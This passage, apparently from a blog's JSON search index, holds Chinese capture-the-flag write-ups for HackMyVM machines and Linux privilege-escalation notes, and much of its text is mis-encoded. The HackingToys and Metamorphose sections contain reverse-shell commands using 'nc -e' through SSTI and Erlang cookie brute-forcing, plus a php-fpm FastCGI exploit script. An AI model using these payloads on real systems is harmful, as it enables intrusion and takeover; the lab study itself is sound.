.note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment çœ‹çœ‹.sh think@publisher:~$ cat /opt/run_container.sh cat: /opt/run_container.sh: Permission denied think@publisher:~$ ls -la /opt/run_container.sh -rwxrwxrwx 1 root root 1715 Mar 29 2024 /opt/run_container.sh think@publisher:~$ ls -la /opt ls: cannot open directory '/opt': Permission denied å“nmdï¼Œè¿è¡Œä¸€ä¸‹ think@publisher:~$ /opt/run_container.sh permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1\": dial unix /var/run/docker.sock: connect: permission denied docker: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/create\": dial unix /var/run/docker.sock: connect: permission denied. See 'docker run --help'. List of Docker containers: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get \"http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json?all=1\": dial unix /var/run/docker.sock: connect: permission denied Enter the ID of the container or leave blank to create a new one: å•Šè¿™ï¼Œè¿™ä¸ªç©æ„æ˜¯dockerçš„ï¼Œè¿˜è¦è¾“å…¥ä¸€ä¸ªidï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Œä¸ä¼šäº†ï¼Œè¿™æ˜¯easyéš¾åº¦å•Šæˆ‘é  æŒ‰ç…§ä½œè€…æ€è·¯ï¼Œä½ å…ˆè¦å‘ç°è¿™ç©æ„ä½ è¿ä¸Šçš„ä¸æ˜¯bash think@publisher:~$ env SHELL=/usr/sbin/ash æ‰€ä»¥æˆ‘ä»¬è¦å»ç”Ÿæˆä¸€ä¸ªbash shellï¼Œæ¯”å¦‚å‰é¢/lib/x86_64-linux-gnu/ld-linux-x86â€“64.so.2 /bin/bash think@publisher:/usr/lib64$ ls -la total 8 drwxr-xr-x 2 root root 4096 Dec 8 2023 . drwxr-xr-x 14 root root 4096 Feb 23 2022 .. lrwxrwxrwx 1 root root 32 Nov 2","date":"2025-03-05","objectID":"/hmv_publisher/:1:4","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"ä¸ºä»€ä¹ˆOPTä¸å¯ä»¥è®¿é—®å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬çš„shellæ˜¯ASH å…¶æ¬¡æ˜¯apparmor é™åˆ¶äº†ï¼Œapparmor å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œé¶æœºé‡Œå°±æ˜¯é™åˆ¶å‘¢æˆ‘ä»¬çš„shell ASH ï¼Œä¸‹é¢æ˜¯å¯¹ASHé™åˆ¶çš„é…ç½®æ–‡ä»¶ bash-5.0# cd /etc/apparmor.d/ bash-5.0# ls abi disable local nvidia_modprobe tunables usr.sbin.ash usr.sbin.mysqld usr.sbin.tcpdump abstractions force-complain lsb_release sbin.dhclient usr.bin.man usr.sbin.ippusbxd usr.sbin.rsyslogd bash-5.0# cat usr.sbin.ash #include \u003ctunables/global\u003e /usr/sbin/ash flags=(complain) { #include \u003cabstractions/base\u003e #include \u003cabstractions/bash\u003e #include \u003cabstractions/consoles\u003e #include \u003cabstractions/nameservice\u003e #include \u003cabstractions/user-tmp\u003e # Remove specific file path rules # Deny access to certain directories deny /opt/ r, deny /opt/** rwx, /usr/bin/** mrix, /usr/sbin/** mrix, # Simplified rule for accessing /home directory owner /home/** rwix, } å¯ä»¥çœ‹åˆ°æ˜¯ deny /opt/ r deny /opt/** rwxï¼Œé™åˆ¶äº†æˆ‘ä»¬å¯¹OPTæ–‡ä»¶å¤¹é‡Œè¾¹çš„æ–‡ä»¶çš„æ‰€æœ‰æƒé™ å› æ­¤æˆ‘ä»¬é€šè¿‡åŠ¨æ€é“¾æ¥åº“å›åˆ° bash ç¯å¢ƒåï¼Œæ”¹é…ç½®æ–‡ä»¶å°±å¯¹æˆ‘ä»¬ä¸èµ·æ•ˆäº† ","date":"2025-03-05","objectID":"/hmv_publisher/:1:5","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"HackingToys ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:0","tags":["æ¸—é€"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=HackingToys ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:1","tags":["æ¸—é€"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.178 08:00:27:23:bb:bb (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.873 seconds (136.68 hosts/sec). 4 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap 192.168.31.178 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 20:19 HKT Nmap scan report for 192.168.31.178 Host is up (0.0013s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 3000/tcp open ppp MAC Address: 08:00:27:23:BB:BB (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds æœ‰sslè¯ä¹¦ï¼Œhttpsè®¿é—®3000ç«¯å£ ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:2","tags":["æ¸—é€"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["é¶åœº"],"content":"åå¼¹shell æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥1è¯•è¯• Product does not exist url https://192.168.31.178:3000/search?query=1\u0026message=Product+does+not+exist åƒæ˜¯ssti https://192.168.31.178:3000/search?query=1\u0026message=%3c%25%3d+7*7+%25%3e å›æ˜¾49 å¼¹shell \u003c%= system(\"nc -e /bin/sh 192.168.31.183 4444\"); %\u003e æˆåŠŸå•¦ï¼Œä½†æ˜¯è¿™ä¸ªç”¨æˆ·æ²¡æœ‰flagï¼Œè‰äº† ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:3","tags":["æ¸—é€"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["é¶åœº"],"content":"ææƒ lidia@MiWiFi-R4CM-srv:/home$ ss -nltp ss -nltp State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess LISTEN 0 511 127.0.0.1:80 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 1024 0.0.0.0:3000 0.0.0.0:* users:((\"ruby\",pid=427,fd=7)) LISTEN 0 4096 127.0.0.1:9000 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* 9000å’Œ80éƒ½ä¸çŸ¥é“åœ¨å¹²å•¥ï¼Œè½¬å‘å‡ºå»ï¼Œå…ˆæŠŠsocatä¸Šä¼  â”Œâ”€â”€(kaliã‰¿kali)-[/usr/bin] â””â”€$ python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... 192.168.31.178 - - [02/Mar/2025 20:49:41] \"GET / HTTP/1.1\" 200 - 192.168.31.178 - - [02/Mar/2025 20:51:31] \"GET /socat HTTP/1.1\" 200 - lidia@MiWiFi-R4CM-srv:/tmp$ wget http://192.168.31.183:8888/socat wget http://192.168.31.183:8888/socat --2025-03-02 13:51:31-- http://192.168.31.183:8888/socat Connecting to 192.168.31.183:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 530680 (518K) [application/octet-stream] Saving to: â€˜socatâ€™ socat 100%[===================\u003e] 518.24K --.-KB/s in 0.02s 2025-03-02 13:51:31 (24.0 MB/s) - â€˜socatâ€™ saved [530680/530680] lidia@MiWiFi-R4CM-srv:/tmp$ ls ls index.html socat systemd-private-f6d16d6478584049844ac1ca3ccaef9a-apache2.service-Pkk09d systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-logind.service-ILjViD systemd-private-f6d16d6478584049844ac1ca3ccaef9a-systemd-timesyncd.service-NsgWNx lidia@MiWiFi-R4CM-srv:/tmp$ chmod +x socat chmod +x socat (remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:80\u0026 [1] 1314 (remote) lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,fork TCP4:127.0.0.1:9000\u0026 [2] 1318 9000ç«¯å£è¿™ä¸ªæ´æ˜¯å¯ä»¥æ‰“çš„ï¼Œå‚è€ƒhttps://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi è¿™ä¸ªç«¯å£çš„ä¿¡æ¯å¯ä»¥çœ‹https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.html #!/bin/bash PAYLOAD=\"\u003c?php echo '\u003c!--'; system('whoami'); echo '--\u003e';\" FILENAMES=\"/var/www/html/index.php\" # Exisiting file path HOST=$1 B64=$(echo \"$PAYLOAD\"|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \\ PHP_VALUE=\"allow_url_include=1\"$'\\n'\"allow_url_fopen=1\"$'\\n'\"auto_prepend_file='data://text/plain\\;base64,$B64'\" \\ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \\ cgi-fcgi -bind -connect $HOST:9001 \u0026\u003e $OUTPUT cat $OUTPUT done æ‰“ä¸€ä¸‹è¯•è¯• ./exp.sh 192.168.31.178 Content-type: text/html; charset=UTF-8 \u003c!--dodi uid=1001(dodi) gid=1001(dodi) groups=1001(dodi),100(users) --\u003e .......... ä¿®æ”¹ä¸€ä¸‹å¼¹shellå°±è¡Œäº† (remote) dodi@hacktoys:/home/dodi$ sudo -l Matching Defaults entries for dodi on hacktoys: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User dodi may run the following commands on hacktoys: (ALL : ALL) NOPASSWD: /usr/local/bin/rvm_rails.sh (remote) dodi@hacktoys:/home/dodi$ cat /usr/local/bin/rvm_rails.sh #!/bin/bash export rvm_prefix=/usr/local export MY_RUBY_HOME=/usr/local/rvm/rubies/ruby-3.1.0 export RUBY_VERSION=ruby-3.1.0 export rvm_version=1.29.12 export rvm_bin_path=/usr/local/rvm/bin export GEM_PATH=/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global export GEM_HOME=/usr/local/rvm/gems/ruby-3.1.0 export PATH=/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin export IRBRC=/usr/local/rvm/rubies/ruby-3.1.0/.irbrc export rvm_path=/usr/local/rvm exec /usr/local/rvm/gems/ruby-3.1.0/bin/rails \"$@\" (remote) dodi@hacktoys:/home/dodi$ ls -la /usr/local/rvm/gems/ruby-3.1.0/bin/rails -rwxrwxr-x 1 root rvm 566 May 20 13:51 /usr/local/rvm/gems/ruby-3.1.0/bin/rails (remote) dodi@hacktoys:/home/dodi$ cat /etc/group | grep rvm rvm:x:1002:lidia,root (remote) lidia@hacktoys:/opt/app/gadgets$ echo '/bin/bash' \u003e /usr/local/rvm/gems/ruby-3.1.0/bin/rails æ‰§è¡Œä¸€ä¸‹ï¼Œgameover ","date":"2025-03-03","objectID":"/hmv_hackingtoys/:1:4","tags":["æ¸—é€"],"title":"HMV HackingToys","uri":"/hmv_hackingtoys/"},{"categories":["é¶åœº"],"content":"Metamorphose ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:0","tags":["æ¸—é€"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Metamorphose ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:1","tags":["æ¸—é€"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ sudo arp-scan -l -I eth0 [sudo] password for kali: Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183 WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.31.1 58:ea:1f:38:ff:17 (Unknown) 192.168.31.25 08:00:27:78:88:2c (Unknown) 192.168.31.186 42:60:96:7b:26:bd (Unknown: locally administered) 192.168.31.210 f4:6d:3f:27:e6:fb (Unknown) 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.936 seconds (132.23 hosts/sec). 4 responded â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -sSV -p- -T5 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:25 HKT Nmap scan report for 192.168.31.25 Host is up (0.0017s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) 4369/tcp open epmd Erlang Port Mapper Daemon 39441/tcp open unknown MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 139.14 seconds ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:2","tags":["æ¸—é€"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["é¶åœº"],"content":"åå¼¹shell epmdçš„ä¿¡æ¯åœ¨https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html æœ‰ æŒ‰ç€è¿™ä¸ªæ–¹æ³•æ‰“ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ echo -n -e \"\\x00\\x01\\x6e\" | nc -vn 192.168.31.25 4369 (UNKNOWN) [192.168.31.25] 4369 (epmd) open name network at port 39441 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:29 HKT Nmap scan report for 192.168.31.25 Host is up (0.0020s latency). PORT STATE SERVICE VERSION 4369/tcp open epmd Erlang Port Mapper Daemon | epmd-info: | epmd_port: 4369 | nodes: |_ network: 39441 MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds githubæ˜¯æœ‰ä¸ªé¡¹ç›®çš„https://github.com/gteissier/erl-matter ç›´æ¥å»æ‰¾è¿™ä¸ªæ¼æ´ä¹Ÿå¯ä»¥ï¼Œä¸»è¦æ˜¯å»çˆ†ç ´cookie æŠŠrockyouå­—å…¸æå–ç‚¹å‡ºæ¥ head -n 1000 /usr/share/wordlists/rockyou.txt \u003e rockyou_top1000.txt çˆ†ç ´ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/epmd/erl-matter-master] â””â”€$ for i in $(cat ./rockyou_top1000.txt); do if ! python2 shell-erldp.py 192.168.31.25 39441 \"$i\" whoami 2\u003e\u00261 | grep -q \"wrong cookie, auth unsuccessful\"; then echo \"[+] cookie:$i\"; break; fi; done [+] cookie:batman python2 shell-erldp.py 192.168.31.25 39441 batman 'nc -e /bin/bash 192.168.31.183 4444' [*] authenticated onto victim åå¼¹shellå®Œæˆ ","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:3","tags":["æ¸—é€"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["é¶åœº"],"content":"ææƒ linpeasä¼ ä¸Šå»æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œæœ‰çš„ä¹Ÿæ˜¯æƒé™ä¸å¤Ÿ melbourne@MiWiFi-R4CM-srv:/$ ss -lntp ss -lntp State Recv-Q Send-Q Local Address:Port Peer Address:PortProcess LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 128 0.0.0.0:39441 0.0.0.0:* users:((\"beam.smp\",pid=864,fd=17)) LISTEN 0 128 [::]:22 [::]:* LISTEN 0 50 *:2181 *:* LISTEN 0 50 [::ffff:127.0.0.1]:9092 *:* LISTEN 0 4096 *:4369 *:* LISTEN 0 50 *:37371 *:* LISTEN 0 50 *:37883 *:* å±…ç„¶è¿˜æœ‰ä¸ª9092ç«¯å£åœ¨è·‘ä¸œè¥¿ï¼Œå»çœ‹çœ‹ï¼Œæ˜¯kafkaåœ¨è·‘ï¼Œå»çœ‹çœ‹è¿™ç©æ„ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ls -la ls -la total 184 drwxrwxr-x 3 root root 4096 Feb 17 2024 . drwxrwxr-x 8 root root 4096 Feb 26 2024 .. -rwxrwxr-x 1 root root 1423 Nov 24 2023 connect-distributed.sh -rwxrwxr-x 1 root root 1396 Nov 24 2023 connect-mirror-maker.sh -rwxrwxr-x 1 root root 963 Nov 24 2023 connect-plugin-path.sh -rwxrwxr-x 1 root root 1420 Nov 24 2023 connect-standalone.sh -rwxrwxr-x 1 root root 861 Nov 24 2023 kafka-acls.sh -rwxrwxr-x 1 root root 873 Nov 24 2023 kafka-broker-api-versions.sh -rwxrwxr-x 1 root root 871 Nov 24 2023 kafka-cluster.sh -rwxrwxr-x 1 root root 864 Nov 24 2023 kafka-configs.sh -rwxrwxr-x 1 root root 945 Nov 24 2023 kafka-console-consumer.sh -rwxrwxr-x 1 root root 944 Nov 24 2023 kafka-console-producer.sh -rwxrwxr-x 1 root root 871 Nov 24 2023 kafka-consumer-groups.sh -rwxrwxr-x 1 root root 959 Nov 24 2023 kafka-consumer-perf-test.sh -rwxrwxr-x 1 root root 882 Nov 24 2023 kafka-delegation-tokens.sh -rwxrwxr-x 1 root root 880 Nov 24 2023 kafka-delete-records.sh -rwxrwxr-x 1 root root 866 Nov 24 2023 kafka-dump-log.sh -rwxrwxr-x 1 root root 877 Nov 24 2023 kafka-e2e-latency.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-features.sh -rwxrwxr-x 1 root root 865 Nov 24 2023 kafka-get-offsets.sh -rwxrwxr-x 1 root root 867 Nov 24 2023 kafka-jmx.sh -rwxrwxr-x 1 root root 870 Nov 24 2023 kafka-leader-election.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-log-dirs.sh -rwxrwxr-x 1 root root 881 Nov 24 2023 kafka-metadata-quorum.sh -rwxrwxr-x 1 root root 873 Nov 24 2023 kafka-metadata-shell.sh -rwxrwxr-x 1 root root 862 Nov 24 2023 kafka-mirror-maker.sh -rwxrwxr-x 1 root root 959 Nov 24 2023 kafka-producer-perf-test.sh -rwxrwxr-x 1 root root 874 Nov 24 2023 kafka-reassign-partitions.sh -rwxrwxr-x 1 root root 885 Nov 24 2023 kafka-replica-verification.sh -rwxrwxr-x 1 root root 10884 Nov 24 2023 kafka-run-class.sh -rwxrwxr-x 1 root root 1376 Nov 24 2023 kafka-server-start.sh -rwxrwxr-x 1 root root 1361 Nov 24 2023 kafka-server-stop.sh -rwxrwxr-x 1 root root 860 Nov 24 2023 kafka-storage.sh -rwxrwxr-x 1 root root 956 Nov 24 2023 kafka-streams-application-reset.sh -rwxrwxr-x 1 root root 863 Nov 24 2023 kafka-topics.sh -rwxrwxr-x 1 root root 879 Nov 24 2023 kafka-transactions.sh -rwxrwxr-x 1 root root 958 Nov 24 2023 kafka-verifiable-consumer.sh -rwxrwxr-x 1 root root 958 Nov 24 2023 kafka-verifiable-producer.sh -rwxrwxr-x 1 root root 1714 Nov 24 2023 trogdor.sh drwxrwxr-x 2 root root 4096 Nov 24 2023 windows -rwxrwxr-x 1 root root 867 Nov 24 2023 zookeeper-security-migration.sh -rwxrwxr-x 1 root root 1393 Nov 24 2023 zookeeper-server-start.sh -rwxrwxr-x 1 root root 1366 Nov 24 2023 zookeeper-server-stop.sh -rwxrwxr-x 1 root root 1019 Nov 24 2023 zookeeper-shell.sh é‚£ä¼°è®¡å¾—å­¦ä¸€ä¸‹è¿™ç©æ„äº† åˆ—å‡ºä¸»é¢˜åˆ—è¡¨ï¼š melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./\\kafka-topics.sh --list --bootstrap-server localhost:9092 \u003c-topics.sh --list --bootstrap-server localhost:9092 __consumer_offsets internal_logs user_feedback users.properties melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ kafaké‡Œé¢çš„èº«ä»½ä¸»è¦åˆ†ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¸¤ç§ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºç”Ÿäº§è€…å‘é€æ¶ˆæ¯ï¼Œæ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯ã€‚ä¸‹é¢æˆ‘ä»¬è¦è¯»å–ä¸»é¢˜é‡Œé¢çš„ä¿¡æ¯ã€‚ melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic users.properties --from-beginning \u003chost:9092 --topic users.properties --from-beginning {\"username\": \"root\", \"password\": \"e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054\", \"email\": \"root@metamorphose.hmv\", \"r","date":"2025-03-02","objectID":"/hmv_metamorphose/:1:4","tags":["æ¸—é€"],"title":"HMV Metamorphose","uri":"/hmv_metamorphose/"},{"categories":["é¶åœº","æ‚è°ˆ"],"content":"linuxææƒ ","date":"2025-03-01","objectID":"/linux%E7%AC%94%E8%AE%B0/:1:0","tags":["æ¸—é€"],"title":"Linuxç¬”è®°","uri":"/linux%E7%AC%94%E8%AE%B0/"},{"categories":["é¶åœº","æ‚è°ˆ"],"content":"ä¿¡æ¯æ”¶é›† hostname hostnameå‘½ä»¤å°†è¿”å›ç›®æ ‡è®¡ç®—æœºçš„ä¸»æœºåã€‚å°½ç®¡è¯¥å€¼å¯ä»¥å¾ˆå®¹æ˜“åœ°æ›´æ”¹æˆ–å…·æœ‰ç›¸å¯¹æ— æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ Ubuntu-3487340239ï¼‰ï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿåœ¨ä¼ä¸šç½‘ç»œä¸­çš„è§’è‰²çš„ä¿¡æ¯ uname -a å°†æ‰“å°ç³»ç»Ÿä¿¡æ¯ï¼Œä¸ºæˆ‘ä»¬æä¾›æœ‰å…³ç³»ç»Ÿä½¿ç”¨çš„å†…æ ¸çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚è¿™åœ¨æœç´¢ä»»ä½•å¯èƒ½å¯¼è‡´æƒé™å‡çº§çš„æ½œåœ¨å†…æ ¸æ¼æ´(searchsploit)æ—¶éå¸¸æœ‰ç”¨ã€‚ /proc/version proc æ–‡ä»¶ç³»ç»Ÿ (procfs) æä¾›æœ‰å…³ç›®æ ‡ç³»ç»Ÿè¿›ç¨‹çš„ä¿¡æ¯ã€‚æ‚¨ä¼šåœ¨è®¸å¤šä¸åŒçš„Linuxç‰ˆæœ¬ä¸­æ‰¾åˆ° procï¼Œè¿™ä½¿å…¶æˆä¸ºæ‚¨çš„å·¥å…·åº“ä¸­å¿…ä¸å¯å°‘çš„å·¥å…·ã€‚ æŸ¥çœ‹/proc/version å¯èƒ½ä¼šä¸ºæ‚¨æä¾›æœ‰å…³å†…æ ¸ç‰ˆæœ¬çš„ä¿¡æ¯ä»¥åŠå…¶ä»–æ•°æ®ï¼Œä¾‹å¦‚æ˜¯å¦å®‰è£…äº†ç¼–è¯‘å™¨ï¼ˆä¾‹å¦‚ GCCï¼‰ã€‚ /etc/issue å¯ä»¥é€šè¿‡æŸ¥çœ‹/etc/issueæ–‡ä»¶æ¥è¯†åˆ«ç³»ç»Ÿã€‚è¯¥æ–‡ä»¶é€šå¸¸åŒ…å«ä¸€äº›æœ‰å…³æ“ä½œç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä½†å¯ä»¥è½»æ¾è‡ªå®šä¹‰æˆ–æ›´æ”¹ã€‚åœ¨è¿™ä¸ªä¸»é¢˜ä¸Šï¼Œä»»ä½•åŒ…å«ç³»ç»Ÿä¿¡æ¯çš„æ–‡ä»¶éƒ½å¯ä»¥å®šåˆ¶æˆ–æ›´æ”¹ã€‚ä¸ºäº†æ›´æ¸…æ¥šåœ°äº†è§£ç³»ç»Ÿï¼Œæœ€å¥½æŸ¥çœ‹æ‰€æœ‰è¿™äº›å†…å®¹ã€‚ ps så‘½ä»¤æ˜¯æŸ¥çœ‹Linuxç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„æœ‰æ•ˆæ–¹æ³•ã€‚ åœ¨ç»ˆç«¯ä¸Šè¾“å…¥pså°†æ˜¾ç¤ºå½“å‰ shell çš„è¿›ç¨‹ã€‚ ps -aæŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ ps axjfæŸ¥çœ‹è¿›ç¨‹æ ‘ ps aux auxé€‰é¡¹å°†æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ (a)ã€æ˜¾ç¤ºå¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ· (u) ä»¥åŠæ˜¾ç¤ºæœªè¿æ¥åˆ°ç»ˆç«¯çš„è¿›ç¨‹ (x)ã€‚æŸ¥çœ‹ps auxå‘½ä»¤çš„è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¥½åœ°äº†è§£ç³»ç»Ÿå’Œæ½œåœ¨çš„æ¼æ´ env envå‘½ä»¤å°†æ˜¾ç¤ºç¯å¢ƒå˜é‡ã€‚ PATH å˜é‡å¯èƒ½å…·æœ‰ç¼–è¯‘å™¨æˆ–è„šæœ¬è¯­è¨€ï¼ˆä¾‹å¦‚Pythonï¼‰ï¼Œå¯ç”¨äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œä»£ç æˆ–ç”¨äºæƒé™å‡çº§ã€‚ sudo -l ç›®æ ‡ç³»ç»Ÿå¯ä»¥é…ç½®ä¸ºå…è®¸ç”¨æˆ·ä»¥ root æƒé™è¿è¡ŒæŸäº›ï¼ˆæˆ–å…¨éƒ¨ï¼‰å‘½ä»¤ã€‚ sudo -lå‘½ä»¤å¯ç”¨äºåˆ—å‡ºç”¨æˆ·å¯ä»¥ä½¿ç”¨sudoè¿è¡Œçš„æ‰€æœ‰å‘½ä»¤ id idå‘½ä»¤å°†æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ã€‚ä¹Ÿå¯ä»¥æ˜¾ç¤ºæ˜¯å¦ç£ç›˜æŒ‚è½½ /etc/passwd /etc/passwdæ–‡ä»¶åŒ…å«æœ‰å…³æ‰€æœ‰ç”¨æˆ·å¸æˆ·çš„ä¿¡æ¯ã€‚ä½†æ˜¯è¯»çš„å¾ˆæ…¢ï¼Œè€Œä¸”ä¸€å †ä¿¡æ¯å¯èƒ½æ²¡ç”¨ï¼Œæœ‰ç”¨çš„éƒ½åœ¨/homeä¸‹ history ä½¿ç”¨historyå‘½ä»¤æŸ¥çœ‹æ—©æœŸå‘½ä»¤å¯ä»¥è®©æˆ‘ä»¬äº†è§£ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”ï¼ˆå°½ç®¡å¾ˆå°‘ï¼‰å­˜å‚¨äº†å¯†ç æˆ–ç”¨æˆ·åç­‰ä¿¡æ¯ã€‚ ifconfig ifconfigå‘½ä»¤å°†æ˜¾ç¤ºç½‘ç»œæ¥å£çš„ä¿¡æ¯ã€‚ip aä¹Ÿå¯ä»¥ï¼Œip routeå‘½ä»¤å¯ä»¥æŸ¥çœ‹å­˜åœ¨å“ªäº›ç½‘ç»œè·¯ç”± find 